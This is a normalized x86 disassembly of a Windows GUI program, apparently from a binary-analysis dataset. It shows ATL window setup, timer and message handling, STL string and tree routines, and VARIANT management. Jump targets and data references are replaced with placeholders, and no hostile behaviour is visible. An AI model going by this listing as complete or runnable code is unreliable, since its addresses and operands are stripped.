mov ecx [ ebp + 0x8 ]
add ecx 0xa0
call sub_40c140
mov [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x38 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_40c860
sub esp 0x10
push ebx
mov ebx ecx
mov eax [ ebx + 0xa4 ]
push edi
mov edi [ eax ]
cmp edi eax
mov [ esp + 0x8 ] edi
je r-xdata
mov ecx [ ebx + 0xa8 ]
xor eax eax
test ecx ecx
pop edi
setne al
pop ebx
add esp 0x10
retn
push ebp
push esi
lea ebp [ ebx + 0xac ]
nop
mov eax [ ebp + 0x4 ]
mov [ esp + 0x18 ] eax
lea eax [ esp + 0x18 ]
add eax 0xc
push eax
push esi
call [ ??$?MDU?$char_traits@D@std@@V?$allocator@D@1@@std@@YA_NABV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@0@Z@IAT ]
add esp 0x8
test al al
jne r-xdata
lea ecx [ esp + 0x10 ]
call sub_40ab70
mov edi [ esp + 0x10 ]
push edi
lea ecx [ esp + 0x20 ]
push ecx
lea ecx [ ebx + 0xa0 ]
call sub_40c220
mov edi [ eax ]
mov [ esp + 0x10 ] edi
jmp r-xdata
lea eax [ esp + 0x14 ]
jmp r-xdata
lea esi [ edi + 0xc ]
push esi
mov ecx ebp
call sub_40b440
cmp eax [ ebp + 0x4 ]
mov [ esp + 0x14 ] eax
je r-xdata
pop esi
pop ebp
cmp edi [ ebx + 0xa4 ]
jne r-xdata
mov eax [ eax ]
cmp [ ebx + 0xb0 ] eax
je r-xdata
sub_40c930
push esi
mov esi ecx
call sub_40bf80
mov [ esi + 0x4 ] eax
mov [ eax + 0x29 ] 0x1
mov eax [ esi + 0x4 ]
mov [ eax + 0x4 ] eax
mov eax [ esi + 0x4 ]
mov [ eax ] eax
mov eax [ esi + 0x4 ]
mov [ eax + 0x8 ] eax
mov [ esi + 0x8 ] 0x0
mov eax esi
pop esi
retn 0x8
sub_40c960
push ebx
mov ebx [ esp + 0x10 ]
push esi
mov esi [ esp + 0x10 ]
push edi
mov edi ecx
mov eax [ edi + 0x4 ]
cmp esi [ eax ]
jne r-xdata
cmp esi ebx
je r-xdata
cmp ebx eax
jne r-xdata
mov eax [ esp + 0x10 ]
pop edi
mov [ eax ] esi
pop esi
pop ebx
retn 0xc
mov al [ esi + 0x29 ]
test al al
mov ecx esi
jne r-xdata
mov eax [ eax + 0x4 ]
push eax
mov ecx edi
call sub_40c020
mov eax [ edi + 0x4 ]
mov [ eax + 0x4 ] eax
mov eax [ edi + 0x4 ]
mov [ edi + 0x8 ] 0x0
mov [ eax ] eax
mov eax [ edi + 0x4 ]
mov [ eax + 0x8 ] eax
mov ecx [ edi + 0x4 ]
mov edx [ ecx ]
mov eax [ esp + 0x10 ]
pop edi
pop esi
mov [ eax ] edx
pop ebx
retn 0xc
push ecx
lea eax [ esp + 0x18 ]
push eax
mov ecx edi
call sub_40c220
cmp esi ebx
jne r-xdata
mov eax [ esi + 0x8 ]
mov dl [ eax + 0x29 ]
test dl dl
jne r-xdata
mov eax [ esi + 0x4 ]
mov dl [ eax + 0x29 ]
test dl dl
jne r-xdata
mov esi eax
mov eax [ esi ]
mov dl [ eax + 0x29 ]
test dl dl
jne r-xdata
mov esi eax
cmp esi [ eax + 0x8 ]
jne r-xdata
mov edi edi
mov esi eax
mov eax [ eax + 0x4 ]
mov dl [ eax + 0x29 ]
test dl dl
je r-xdata
mov esi eax
mov eax [ esi ]
mov dl [ eax + 0x29 ]
test dl dl
je r-xdata
jmp r-xdata
sub_40ca20
push ebx
mov ebx [ esp + 0xc ]
push esi
mov esi [ esp + 0xc ]
cmp esi ebx
je r-xdata
pop esi
pop ebx
retn 0x8
push edi
mov edi [ VariantClear@IAT ]
add esi 0x10
cmp esi ebx
jne r-xdata
push eax
call sub_42cee0
push esi
call edi
test eax eax
jge r-xdata
pop edi
sub_40ca50
mov eax [ esp + 0xc ]
push esi
mov esi [ esp + 0xc ]
push edi
mov edi [ esp + 0xc ]
push eax
push ecx
mov ecx [ esp + 0x1c ]
push ecx
push esi
push edi
call sub_40c0b0
mov eax esi
add esp 0x14
shl eax 0x4
add eax edi
pop edi
pop esi
retn 0xc
sub_40ca80
push 0xffffffff
push sub_430298
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x8
push ebx
push ebp
push esi
push edi
xor ebp ebp
push ebp
push ecx
mov eax esp
mov [ esp + 0x1c ] esp
push ebp
push 0x46000000
mov edi ecx
push ebp
push ecx
mov [ eax ] 0x3e9
mov eax esp
lea ecx [ edi + 0x90 ]
mov [ eax ] ecx
mov edx [ edi + 0x4 ]
mov [ esp + 0x2c ] esp
lea ebx [ edi + 0x8c ]
push edx
mov ecx ebx
call sub_40b220
mov [ esp + 0x10 ] ebp
mov [ esp + 0x20 ] ebp
mov eax [ esp + 0x10 ]
cmp eax ebp
je r-xdata
push ebp
push r--data
push ebp
lea edx [ esp + 0x1c ]
push edx
push ebp
push r--data
mov ecx ebx
mov [ esp + 0x28 ] ebp
call sub_40c540
cmp eax ebp
jl r-xdata
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
mov edx [ ebx ]
push edx
call [ DestroyWindow@IAT ]
test eax eax
je r-xdata
cmp [ esp + 0x10 ] ebp
je r-xdata
mov [ esp + 0x20 ] 0xffffffff
mov eax [ esp + 0x10 ]
cmp eax ebp
je r-xdata
mov [ ebx ] ebp
mov eax [ edi + 0x88 ]
cmp eax ebp
lea esi [ edi + 0x88 ]
je r-xdata
mov [ esp + 0x14 ] ebp
mov [ esp + 0x20 ] 0x2
mov eax [ esp + 0x10 ]
cmp eax ebp
jne r-xdata
mov ecx [ esp + 0x18 ]
pop edi
pop esi
pop ebp
xor eax eax
mov [ fs : 0x0 ] ecx
pop ebx
add esp 0x14
retn
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
push esi
push r--data
mov ecx ebx
mov [ esi ] ebp
call sub_40b820
cmp eax ebp
jl r-xdata
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
mov ecx [ eax ]
lea edx [ esp + 0x14 ]
push edx
push r--data
push eax
call [ ecx ]
mov [ esp + 0x20 ] 0x0
lea ecx [ esp + 0x14 ]
call sub_40b0b0
push 0x80004003
call sub_42cee0
mov eax [ esp + 0x10 ]
mov eax [ esi ]
lea edx [ edi + 0x82 ]
push edx
lea ecx [ edi + 0x80 ]
push ecx
lea ebp [ edi + 0x70 ]
push ebp
lea edx [ edi + 0x60 ]
push edx
push eax
call [ Ordinal_ATL71_54@IAT ]
test eax eax
jl r-xdata
xor ebp ebp
cmp [ esi ] 0x0
jne r-xdata
mov eax [ esi ]
mov ecx [ eax ]
push 0x0
push eax
call [ ecx + 0x110 ]
cmp [ esi ] 0x0
jne r-xdata
push 0x80004003
call sub_42cee0
mov eax [ esi ]
mov edx [ eax ]
push 0x0
push eax
call [ edx + 0x100 ]
cmp [ esi ] 0x0
jne r-xdata
push 0x80004003
call sub_42cee0
mov eax [ esi ]
mov ecx [ eax ]
push 0xffffffff
push eax
call [ ecx + 0xa4 ]
cmp [ esi ] 0x0
jne r-xdata
push 0x80004003
call sub_42cee0
mov eax [ esi ]
mov edx [ eax ]
push 0xffffffff
push eax
call [ edx + 0xf0 ]
mov esi [ esi ]
lea eax [ edi + 0x5c ]
mov edx [ eax + 0x28 ]
cmp edx 0xfefefefe
lea ecx [ eax + 0x28 ]
jne r-xdata
push 0x80004003
call sub_42cee0
push ecx
push ebp
push eax
push esi
call [ Ordinal_ATL71_10@IAT ]
test eax eax
jl r-xdata
mov eax [ ebx ]
push 0x8
push eax
call [ ShowWindow@IAT ]
mov [ esp + 0x20 ] 0xffffffff
mov eax [ esp + 0x10 ]
test eax eax
je r-xdata
mov eax 0x1
mov ecx [ esp + 0x18 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebp
pop ebx
add esp 0x14
retn
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
sub_40ccb0
mov eax [ esp + 0x10 ]
mov edx [ esp + 0x8 ]
push esi
push eax
mov eax [ esp + 0xc ]
mov esi ecx
mov ecx [ esp + 0x14 ]
push ecx
push edx
push eax
mov ecx esi
call sub_418b70
mov ecx esi
call sub_40ca80
test eax eax
je r-xdata
xor eax eax
pop esi
retn 0x10
mov ecx esi
call sub_40b0f0
push 0x0
call [ _time64@IAT ]
mov [ esi + 0x10c ] eax
mov edx [ rw-data ]
mov eax [ rw-data ]
xor ecx ecx
mov cl [ rw-data ]
push ecx
mov ecx [ esi + 0xc8 ]
push edx
push eax
push ecx
push 0x0
push 0xc
call sub_414860
mov edx [ esi + 0x4 ]
add esp 0x1c
push 0x0
push 0x3e8
push 0x4
push edx
call [ SetTimer@IAT ]
sub_40cd30
mov eax [ esp + 0x8 ]
cmp eax 0x4
push esi
mov esi ecx
je r-xdata
mov eax [ esi + 0xc4 ]
test eax eax
je r-xdata
mov ecx [ esp + 0x14 ]
mov edx [ esp + 0x10 ]
push ecx
push edx
push eax
mov eax [ esp + 0x14 ]
push eax
mov ecx esi
call sub_418bc0
pop esi
retn 0x10
mov eax [ esi + 0x88 ]
test eax eax
je r-xdata
push eax
call [ IsWindowEnabled@IAT ]
test eax eax
je r-xdata
xor eax eax
pop esi
retn 0x10
test eax eax
mov [ esp + 0xc ] 0x0
jne r-xdata
mov eax [ esi + 0x88 ]
mov ecx [ eax ]
lea edx [ esp + 0xc ]
push edx
push eax
call [ ecx + 0x7c ]
test eax eax
jl r-xdata
push 0x80004003
call sub_42cee0
cmp [ esp + 0xc ] 0x0
jne r-xdata
mov eax [ esi + 0x4 ]
push 0x4
push eax
call [ KillTimer@IAT ]
mov ecx esi
call sub_40c860
test al al
je r-xdata
mov edx [ esi + 0x4 ]
push 0x0
push 0x0
push 0x10
push edx
mov [ esi + 0x108 ] 0x0
call [ PostMessageW@IAT ]
mov ecx [ esi + 0x50 ]
push 0x5
push ecx
call [ ShowWindow@IAT ]
mov ecx esi
call sub_418f60
xor eax eax
pop esi
retn 0x10
sub_40ce00
push ecx
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
mov ecx [ eax ]
push eax
push ecx
lea eax [ esp + 0xc ]
push eax
mov ecx esi
call sub_40c960
mov ecx [ esi + 0x4 ]
push ecx
call ??3@YAXPAX@Z
add esp 0x4
xor eax eax
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] eax
pop esi
pop ecx
retn
sub_40ce30
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov [ esi + 0x4 ] 0x0
mov [ esi + 0x8 ] 0x0
mov [ esi + 0xc ] 0x0
pop esi
retn
mov ecx [ esi + 0x8 ]
push ecx
push eax
mov ecx esi
call sub_40ca20
mov edx [ esi + 0x4 ]
push edx
call ??3@YAXPAX@Z
add esp 0x4
sub_40ce70
push ecx
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
mov ecx [ eax ]
push eax
push ecx
lea eax [ esp + 0xc ]
push eax
mov ecx esi
call sub_40c960
mov ecx [ esi + 0x4 ]
push ecx
call ??3@YAXPAX@Z
add esp 0x4
xor eax eax
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] eax
pop esi
pop ecx
retn
sub_40cea0
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov [ esi + 0x4 ] 0x0
mov [ esi + 0x8 ] 0x0
mov [ esi + 0xc ] 0x0
pop esi
retn
mov ecx [ esi + 0x8 ]
push ecx
push eax
mov ecx esi
call sub_40ca20
mov edx [ esi + 0x4 ]
push edx
call ??3@YAXPAX@Z
add esp 0x4
sub_40cee0
push ebp
mov ebp esp
push 0xffffffff
push sub_4302b0
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x8
push ebx
push esi
push edi
mov [ ebp - 0x10 ] esp
mov esi ecx
mov [ ebp - 0x14 ] esi
xor eax eax
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] eax
mov ebx [ ebp + 0x8 ]
cmp ebx eax
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
cmp ebx 0xfffffff
jbe r-xdata
mov edi ebx
shl edi 0x4
push edi
call sub_42e3bc
add esp 0x4
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] eax
add edi eax
mov [ esi + 0xc ] edi
mov [ ebp - 0x4 ] 0x0
mov eax [ ebp + 0xc ]
push eax
push ebx
mov ecx [ esi + 0x4 ]
push ecx
mov ecx esi
call sub_40ca50
mov [ esi + 0x8 ] eax
call sub_40b4f0
sub_40cf90
push 0xffffffff
push sub_4302c8
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov esi ecx
mov [ esp + 0x4 ] esi
mov [ esp + 0x10 ] 0xffffffff
mov eax [ esi + 0x4 ]
mov ecx [ eax ]
push eax
push ecx
lea eax [ esp + 0xc ]
push eax
mov ecx esi
call sub_40c960
mov ecx [ esi + 0x4 ]
push ecx
call ??3@YAXPAX@Z
mov ecx [ esp + 0xc ]
add esp 0x4
xor eax eax
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] eax
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_40cff0
push 0xffffffff
push sub_430320
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov esi ecx
mov [ esp + 0x4 ] esi
mov [ esi ] r--data
mov [ esi + 0x5c ] r--data
mov [ esp + 0x10 ] 0x3
lea ecx [ esi + 0xb8 ]
call sub_408660
mov [ esp + 0x10 ] 0x2
lea ecx [ esi + 0xac ]
call sub_40cf90
mov [ esp + 0x10 ] 0x1
lea ecx [ esi + 0xa0 ]
call sub_40cf90
mov [ esp + 0x10 ] 0x0
mov eax [ esi + 0x88 ]
test eax eax
je r-xdata
mov [ esp + 0x10 ] 0xffffffff
mov ecx esi
call sub_4190f0
mov ecx [ esp + 0x8 ]
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
sub_40d0d0
mov eax [ esp + 0xc ]
test eax eax
jne r-xdata
push ebx
mov ebx [ esp + 0x8 ]
mov [ eax ] 0x0
mov eax [ esp + 0xc ]
mov ecx [ r--data ]
push ebp
push esi
mov esi [ eax ]
cmp esi ecx
push edi
jne r-xdata
mov eax 0x80004003
retn 0xc
test esi esi
jne r-xdata
mov ecx [ eax + 0x4 ]
mov edx [ r--data ]
cmp ecx edx
mov ebp [ r--data ]
mov edi [ r--data ]
jne r-xdata
cmp esi 0x20400
jne r-xdata
mov ecx [ eax + 0x4 ]
test ecx ecx
jne r-xdata
cmp [ eax + 0x8 ] edi
jne r-xdata
cmp esi [ ebx + 0x14 ]
jne r-xdata
mov ecx [ eax + 0x4 ]
cmp ecx [ r--data ]
jne r-xdata
cmp [ eax + 0x8 ] 0xc0
jne r-xdata
cmp ecx edx
jne r-xdata
cmp [ eax + 0xc ] ebp
je r-xdata
pop edi
pop esi
pop ebp
mov eax 0x80004002
pop ebx
retn 0xc
mov edx [ eax + 0x4 ]
cmp edx [ ebx + 0x18 ]
jne r-xdata
mov edx [ eax + 0x8 ]
cmp edx [ r--data ]
jne r-xdata
cmp [ eax + 0xc ] 0x46000000
je r-xdata
cmp [ eax + 0x8 ] edi
jne r-xdata
mov ecx [ eax + 0x8 ]
cmp ecx [ ebx + 0x1c ]
jne r-xdata
mov ecx [ eax + 0xc ]
cmp ecx [ r--data ]
je r-xdata
mov eax [ esp + 0x1c ]
mov [ eax ] ebx
mov ecx [ ebx ]
push ebx
call [ ecx + 0x4 ]
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
retn 0xc
cmp [ eax + 0xc ] ebp
je r-xdata
mov edx [ eax + 0xc ]
cmp edx [ ebx + 0x20 ]
je r-xdata
sub_40d1e0
mov eax [ esp + 0x18 ]
mov ecx [ esp + 0x14 ]
mov edx [ esp + 0x10 ]
push eax
mov eax [ esp + 0x10 ]
push ecx
mov ecx [ esp + 0x10 ]
push edx
push eax
push ecx
mov ecx rw-data
call sub_4066d0
retn 0x18
sub_40d210
push 0xffffffff
push sub_430350
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push ebx
push esi
push edi
mov [ esp + 0xc ] 0x0
mov [ esp + 0x18 ] 0x1
mov eax [ rw-data ]
mov edx [ eax ]
cmp edx [ r--data ]
jne r-xdata
mov esi [ rw-data ]
mov ebx [ esp + 0x28 ]
xor edi edi
test esi esi
jne r-xdata
mov edx [ eax + 0x4 ]
cmp edx [ r--data ]
jne r-xdata
test esi esi
mov [ esp + 0xc ] esi
je r-xdata
push ebx
mov ecx rw-data
call sub_4060d0
mov esi [ rw-data ]
mov edi eax
mov edx [ eax + 0x8 ]
cmp edx [ r--data ]
jne r-xdata
test edi edi
jge r-xdata
mov ecx [ esi ]
push esi
call [ ecx + 0x4 ]
mov eax [ eax + 0xc ]
cmp eax [ r--data ]
jne r-xdata
mov eax [ esp + 0x2c ]
mov ecx [ esp + 0x24 ]
mov edx [ esp + 0x20 ]
push eax
push ebx
push ecx
push edx
push esi
call sub_4068d0
add esp 0x14
mov edi eax
mov [ esp + 0x18 ] 0xffffffff
test esi esi
je r-xdata
mov [ esp + 0x18 ] 0xffffffff
test esi esi
je r-xdata
mov ecx [ esp + 0x10 ]
mov eax edi
pop edi
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x10
retn 0x10
mov eax [ esi ]
push esi
call [ eax + 0x8 ]
lea edx [ ecx + 0x4 ]
lea eax [ ecx + 0x14 ]
mov [ rw-data ] edx
mov [ rw-data ] eax
mov dx [ ecx + 0x24 ]
mov [ rw-data ] dx
mov ax [ ecx + 0x26 ]
mov [ rw-data ] ax
mov edx [ esi ]
push esi
call [ edx + 0x8 ]
jmp r-xdata
sub_40d320
push ecx
mov eax [ esp + 0x1c ]
test eax eax
push ebx
push ebp
push esi
mov esi ecx
mov ecx 0x1
push edi
mov [ esp + 0x10 ] ecx
jne r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
pop ecx
retn 0x18
mov eax [ esp + 0x1c ]
cmp eax ecx
mov edi [ esp + 0x28 ]
mov ebx [ esp + 0x24 ]
mov ebp [ esp + 0x20 ]
jne r-xdata
cmp eax 0x10
jne r-xdata
lea eax [ esp + 0x10 ]
push eax
push ebx
push ebp
mov [ esp + 0x1c ] ecx
push ecx
mov ecx esi
call sub_40ccb0
jmp r-xdata
cmp eax 0x2
jne r-xdata
mov [ esp + 0x10 ] ecx
mov ecx esi
call sub_40bb80
push 0x0
call [ PostQuitMessage@IAT ]
mov [ edi ] 0x0
jmp r-xdata
mov [ edi ] eax
cmp eax 0x113
jne r-xdata
mov [ esp + 0x10 ] ecx
lea ecx [ esp + 0x10 ]
push ecx
push ebx
push ebp
push eax
mov ecx esi
call sub_418b40
mov eax [ esp + 0x10 ]
test eax eax
je r-xdata
mov eax [ esp + 0x1c ]
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
pop ecx
retn 0x18
push 0x0
push edi
push ebx
push ebp
push eax
mov eax [ esp + 0x2c ]
push eax
mov ecx esi
call sub_40d400
test eax eax
jne r-xdata
lea edx [ esp + 0x10 ]
push edx
push ebx
push ebp
mov [ esp + 0x1c ] ecx
push eax
mov ecx esi
call sub_40cd30
mov [ edi ] eax
mov eax [ esp + 0x10 ]
test eax eax
jne r-xdata
sub_40d400
mov eax [ esp + 0x18 ]
test eax eax
push esi
jne r-xdata
xor eax eax
pop esi
retn 0x18
mov eax [ esp + 0xc ]
mov esi 0x1
cmp eax esi
jne r-xdata
cmp eax 0x18
jne r-xdata
mov edx [ esp + 0x14 ]
lea eax [ esp + 0x1c ]
push eax
mov eax [ esp + 0x14 ]
push edx
push eax
push esi
mov [ esp + 0x2c ] esi
call sub_418b70
jmp r-xdata
cmp eax 0x113
jne r-xdata
mov eax [ esp + 0x14 ]
lea edx [ esp + 0x1c ]
push edx
mov edx [ esp + 0x14 ]
push eax
push edx
push 0x18
mov [ esp + 0x2c ] esi
call sub_418b20
jmp r-xdata
mov ecx [ esp + 0x18 ]
mov [ ecx ] eax
mov eax [ esp + 0x1c ]
test eax eax
je r-xdata
cmp eax 0x200
jne r-xdata
mov eax [ esp + 0x14 ]
lea edx [ esp + 0x1c ]
push edx
mov edx [ esp + 0x14 ]
push eax
push edx
push 0x113
mov [ esp + 0x2c ] esi
call sub_418bc0
jmp r-xdata
mov eax esi
pop esi
retn 0x18
cmp eax 0x2a3
jne r-xdata
mov eax [ esp + 0x14 ]
lea edx [ esp + 0x1c ]
push edx
mov edx [ esp + 0x14 ]
push eax
push edx
push 0x200
mov [ esp + 0x2c ] esi
call sub_418e00
jmp r-xdata
cmp eax 0x14
jne r-xdata
mov eax [ esp + 0x14 ]
lea edx [ esp + 0x1c ]
push edx
mov edx [ esp + 0x14 ]
push eax
push edx
push 0x2a3
mov [ esp + 0x2c ] esi
call sub_418e80
jmp r-xdata
cmp eax 0x67
jne r-xdata
mov eax [ esp + 0x14 ]
lea edx [ esp + 0x1c ]
push edx
mov edx [ esp + 0x14 ]
push eax
push edx
push 0x14
mov [ esp + 0x2c ] esi
call sub_418b30
jmp r-xdata
cmp eax 0x66
jne r-xdata
mov eax [ esp + 0x14 ]
lea edx [ esp + 0x1c ]
push edx
mov edx [ esp + 0x14 ]
push eax
push edx
push 0x67
mov [ esp + 0x2c ] esi
call sub_418eb0
jmp r-xdata
cmp eax 0x2
jne r-xdata
mov eax [ esp + 0x14 ]
lea edx [ esp + 0x1c ]
push edx
mov edx [ esp + 0x14 ]
push eax
push edx
push 0x66
mov [ esp + 0x2c ] esi
call sub_418ee0
jmp r-xdata
cmp eax 0x68
jne r-xdata
mov eax [ esp + 0x14 ]
lea edx [ esp + 0x1c ]
push edx
mov edx [ esp + 0x14 ]
push eax
push edx
push 0x2
mov [ esp + 0x2c ] esi
call sub_418b40
jmp r-xdata
cmp eax 0x10
jne r-xdata
mov eax [ esp + 0x14 ]
lea edx [ esp + 0x1c ]
push edx
mov edx [ esp + 0x14 ]
push eax
push edx
push 0x68
mov [ esp + 0x2c ] esi
call sub_418f10
jmp r-xdata
cmp eax 0x466
jne r-xdata
mov eax [ esp + 0x14 ]
lea edx [ esp + 0x1c ]
push edx
mov edx [ esp + 0x14 ]
push eax
push edx
push 0x10
mov [ esp + 0x2c ] esi
call sub_419040
jmp r-xdata
cmp eax 0x111
jne r-xdata
mov eax [ esp + 0x14 ]
lea edx [ esp + 0x1c ]
push edx
mov edx [ esp + 0x14 ]
push eax
push edx
push 0x466
mov [ esp + 0x2c ] esi
call sub_418f80
jmp r-xdata
mov eax [ esp + 0x10 ]
cmp ax 0xf060
jne r-xdata
lea edx [ esp + 0x1c ]
push edx
mov edx [ esp + 0x18 ]
push edx
push 0xf060
shr eax 0x10
push eax
mov [ esp + 0x2c ] esi
call sub_418f40
sub_40d620
push 0xffffffff
push sub_430368
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov esi ecx
mov [ esp + 0x4 ] esi
call sub_40bf80
mov [ esi + 0x4 ] eax
mov [ eax + 0x29 ] 0x1
mov eax [ esi + 0x4 ]
mov [ eax + 0x4 ] eax
mov eax [ esi + 0x4 ]
mov [ eax ] eax
mov eax [ esi + 0x4 ]
mov [ eax + 0x8 ] eax
mov [ esi + 0x8 ] 0x0
mov [ esp + 0x10 ] 0xffffffff
mov ecx [ esp + 0x8 ]
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_40d680
push 0xffffffff
push sub_430388
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x10
push esi
lea eax [ esp + 0x4 ]
push eax
mov esi ecx
call [ VariantInit@IAT ]
mov [ esp + 0x1c ] 0x0
mov edx [ esp + 0x24 ]
lea ecx [ esp + 0x4 ]
push ecx
push edx
mov ecx esi
call sub_40cee0
mov [ esp + 0x1c ] 0xffffffff
lea eax [ esp + 0x4 ]
push eax
call [ VariantClear@IAT ]
test eax eax
jge r-xdata
mov ecx [ esp + 0x14 ]
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x1c
retn 0x4
push eax
call sub_42cee0
sub_40d6f0
push 0xffffffff
push sub_4303e0
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov esi ecx
push edi
mov [ esp + 0x8 ] esi
call sub_419130
mov [ esp + 0x14 ] 0x0
lea edi [ esi + 0x5c ]
mov ecx edi
call sub_40bce0
mov [ esi ] r--data
mov [ edi ] r--data
mov [ esi + 0x88 ] 0x0
mov [ esp + 0x14 ] 0x1
mov [ esi + 0x8c ] 0x0
call [ Ordinal_ATL71_42@IAT ]
lea ecx [ esi + 0xa0 ]
call sub_40d620
mov [ esp + 0x14 ] 0x2
lea ecx [ esi + 0xac ]
call sub_40d620
mov [ esp + 0x14 ] 0x3
lea ecx [ esi + 0xb8 ]
call sub_408530
mov [ esp + 0x14 ] 0x4
mov [ esi + 0x108 ] 0x1
mov [ esp + 0x14 ] 0xffffffff
mov ecx [ esp + 0xc ]
pop edi
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_40d7d0
push ebp
mov ebp esp
push 0xffffffff
push sub_43040a
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x34
push ebx
push esi
push edi
push 0x2
lea ecx [ ebp - 0x24 ]
call sub_40d680
mov [ ebp - 0x4 ] 0x0
mov eax [ ebp + 0x18 ]
mov esi [ ebp - 0x20 ]
mov ebx [ VariantCopy@IAT ]
push eax
push esi
call ebx
test eax eax
jge r-xdata
mov edi [ ebp + 0x10 ]
lea eax [ esi + 0x10 ]
push edi
push eax
call ebx
xor ebx ebx
cmp eax ebx
jge r-xdata
push eax
call sub_42cee0
cmp [ edi ] 0x8
jne r-xdata
push eax
call sub_42cee0
mov ecx [ ebp + 0x1c ]
mov [ ecx ] bx
mov [ ebp - 0x4 ] 0xffffffff
cmp esi ebx
je r-xdata
call [ rw-data ]
mov esi [ edi + 0x8 ]
test esi esi
mov ebx eax
jne r-xdata
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x18 ] ebx
lea esp [ ebp - 0x4c ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x18
mov edx [ ebp - 0x1c ]
push edx
push esi
lea ecx [ ebp - 0x24 ]
call sub_40ca20
push esi
call ??3@YAXPAX@Z
add esp 0x4
push esi
call [ lstrlenW@IAT ]
lea edi [ eax + eax + 0x2 ]
mov eax edi
add eax 0x3
and eax 0xfffffffc
call sub_42e910
mov eax esp
push ebx
push edi
push esi
push eax
call sub_40a610
xor eax eax
jmp r-xdata
mov ecx [ ebp + 0x10 ]
mov edi [ ecx + 0x8 ]
test edi edi
jne r-xdata
push ecx
lea eax [ ebp + 0x18 ]
push eax
mov ecx esi
call sub_40c220
push eax
lea ecx [ ebp - 0x40 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov [ ebp - 0x4 ] 0x1
mov edi [ ebp + 0x8 ]
lea ecx [ ebp - 0x40 ]
push ecx
lea edx [ ebp + 0x18 ]
lea esi [ edi + 0xa0 ]
push edx
mov ecx esi
call sub_40bd50
mov [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x40 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov eax [ edi + 0xa4 ]
mov ecx [ ebp + 0x18 ]
cmp ecx eax
je r-xdata
push edi
call [ lstrlenW@IAT ]
lea esi [ eax + eax + 0x2 ]
mov eax esi
add eax 0x3
and eax 0xfffffffc
call sub_42e910
mov eax esp
push ebx
push esi
push edi
push eax
call sub_40a610
xor eax eax
jmp r-xdata
push eax
lea ecx [ ebp - 0x40 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov [ ebp - 0x4 ] 0x2
mov ecx [ ebp + 0x8 ]
lea edx [ ebp - 0x40 ]
push edx
lea eax [ ebp - 0x14 ]
push eax
add ecx 0xac
call sub_40c140
mov [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x40 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov esi [ ebp - 0x20 ]
xor ebx ebx
sub_40d970
sub esp 0x1c
mov eax [ rw-data ]
push ebx
push esi
push edi
mov [ esp + 0x24 ] eax
call sub_40db80
mov ebx eax
mov esi [ ebx + 0x4 ]
test esi esi
je r-xdata
pop edi
pop esi
xor eax eax
pop ebx
mov ecx [ esp + 0x18 ]
call sub_42e72f
add esp 0x1c
retn 0x24
mov edx [ esp + 0x30 ]
mov esi [ ebx + 0x24 ]
add ebx 0x20
test esi esi
jne r-xdata
cmp [ ebx + 0xc ] edx
jne r-xdata
cmp [ ebx ] 0x3e9
jne r-xdata
mov ecx 0x4
mov edi r--data
xor eax eax
[ esi ] [ edi ]
je r-xdata
